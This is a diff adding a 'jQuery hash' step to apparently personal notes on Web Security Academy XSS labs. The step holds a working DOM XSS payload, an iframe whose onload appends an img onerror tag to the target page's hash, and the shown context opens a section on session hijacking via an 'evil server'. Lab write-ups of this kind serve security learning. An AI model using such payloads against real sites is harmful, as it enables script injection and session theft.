@@ -40,6 +40,15 @@ and click backlink
 
    ![image](https://github.com/user-attachments/assets/c9b00d4c-ea24-4c01-aadb-3471141427c4)
 
+
+4) jQuery hash
+
+```
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+```
+ 
+![image](https://github.com/user-attachments/assets/5ecb8438-f297-448b-a102-bdf5d2a60bde)
+
 # XSS attack 1: Hijacking the user’s session
 ## Evil server 
 ```bash
